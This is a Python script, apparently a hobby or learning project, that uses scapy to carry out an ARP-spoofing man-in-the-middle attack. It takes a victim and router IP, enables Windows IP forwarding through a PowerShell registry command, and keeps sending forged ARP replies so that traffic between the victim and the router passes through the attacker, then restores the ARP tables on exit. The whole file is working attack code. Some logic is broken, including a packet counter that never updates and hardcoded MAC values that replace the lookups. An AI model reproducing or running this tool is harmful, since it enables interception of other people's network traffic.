import os
import time
import sys
import subprocess
from scapy.all import *
from scapy.layers.l2 import ARP, Ether



def getInfo():
    interface = input("Interface (ifconfig/ipconfig to see):")
    victimIP = input("Victim IP:")
    routerIP = input("Router IP:")
    return [interface, victimIP, routerIP]


def get_MAC(ip, interface):
    # arp request to the victim to get what we need
    answer, unanswer = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=interface, inter=0.1)
    print(answer.summary())
    print(unanswer.summary())
    for send, recieve in answer:
        return recieve.sprintf(r"%Ether.src%") 
        #return "ff:ff:ff:ff:ff:ff" 


def reARP(victimIP, routerIP, interface):
    victimMAC = get_MAC(victimIP, interface)

    routerMAC = get_MAC(routerIP, interface)

    # send 7 arp request to the router from the victimIP to the router in order to reset the arp table
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC, retry=7))

    # same but reverse
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7))

    #os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") 
    subprocess.call('powershell Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 0', shell=True)


def attack(victimIP, victimMAC, routerIP, routerMAC,send_packets):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))  # tell the victim "I am the router"
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))  # tell the router "I am the victim"
    #send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff"))  # tell the router "I am the victim"
    send_packets+=2

def manInTheMiddle():
    info = getInfo()  # list
    #os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    subprocess.call('powershell Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 1', shell=True)

    try:
        #victimMAC = get_MAC(info[1], info[0])
        victimMAC = "ff:ff:ff:ff:ff:ff"
    except Exception:
        print("Victim MAC not found")
        #os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        subprocess.call('powershell Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 0', shell=True)
        sys.exit(1)
    try:
        #routerMAC = get_MAC(info[2], info[0])
        routerMAC = "ea-98-9c-8a-ed-9f"
    except Exception:
        print("Router MAC not found")
        #os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        subprocess.call('powershell Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 0', shell=True)
        sys.exit(1)

    print("Victim MAC: %s" % victimMAC)
    print("Router MAC: %s" % routerMAC)
    send_packets = 0
    while True:
        try:
            attack(info[1], victimMAC, info[2], routerMAC,send_packets)
            print("\r [+]Packets sent: "+str(send_packets),end="")
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP(info[1], info[2], info[0])  # arp table rollback
            break
    sys.exit(1)



manInTheMiddle()